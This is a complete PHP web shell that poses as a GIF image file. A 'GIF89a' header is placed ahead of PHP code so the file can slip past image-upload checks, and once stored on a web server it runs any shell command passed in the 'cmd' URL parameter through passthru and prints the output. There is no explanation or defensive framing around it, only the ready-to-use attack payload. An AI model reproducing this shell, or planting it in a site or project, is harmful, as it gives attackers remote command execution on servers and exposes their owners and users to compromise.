GIF89a;
<?php
echo "<pre>";
passthru($_GET['cmd']);
echo "</pre>";
?>